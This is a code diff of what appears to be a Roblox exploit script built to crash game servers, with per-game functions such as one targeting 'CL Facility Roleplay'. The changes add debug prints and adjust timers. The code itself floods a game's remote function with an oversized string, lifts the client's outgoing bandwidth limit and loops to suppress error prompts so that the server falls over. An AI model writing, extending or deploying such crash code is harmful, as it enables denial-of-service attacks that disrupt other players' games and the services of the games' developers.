@@ -278,6 +278,7 @@ coroutine.wrap(function()
 	local Dir = game:GetService('CoreGui'):WaitForChild("RobloxPromptGui",math.huge):WaitForChild("promptOverlay",math.huge)
 	warn('Found DIRECTORY K~ Crahser');
 	Dir.DescendantAdded:Connect(function(Err)
+		print(Err.Name)
 		if Err.Name == 'ErrorMessage' then
 			Err:GetPropertyChangedSignal('Text'):Connect(function()
 				_G.ErrMessage = tostring(Err.Text)
@@ -290,10 +291,12 @@ coroutine.wrap(function()
 			end)
 		end
 		if Err.Name == "ErrorTitle" then
+			print(Err.Text)
 			Err:GetPropertyChangedSignal("Text"):Connect(function()
 				wait(.55)
 				if Err.Text:sub(0, 12) == "Disconnected" then
 					if _G.Disconnect ~= true then
+						print('So we disconnected right??')
 						SendServerCrashed(tostring(_G.ErrMessage or 'Client disconnected from server or crashed server!'))
 						_G.Disconnect = true
 						spawn(function() while true do game:GetService('GuiService'):ClearError() task.wait() end end) -- Some games check if a ui is there and cancels teleport? Just to fix that problem.
@@ -364,7 +367,6 @@ function C.BasicSetup()
 	end)
 	_G.TimeStarted = tick()
 	TimedStarted = _G.TimeStarted
-	warn('starting lololol')
 	--C['K_'..game.PlaceId]()
 end
 spawn(function()
@@ -808,11 +810,11 @@ function C.K_6416498845() -- CL Facility Roleplay
 	}
 }
 ]]
-
 	SettingsService.RF.Set:InvokeServer({LongString});
 	--end
 	warn('Game server completed sending request!')
 	warn('Attempting to crash')
+		wait(1)
 	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 
@@ -827,9 +829,9 @@ function C.K_6416498845() -- CL Facility Roleplay
 		end
 	end)
 
-	wait(50)
-	warn('Client did not crash server within 50 seconds of Get Request.')
-	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 45 seconds of last Get Request')
+	wait(55)
+	warn('Client did not crash server within 55 seconds of Get Request.')
+	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 55 seconds of last Get Request')
 end
 function C.K_3226555017()
 	repeat wait() until game:IsLoaded()
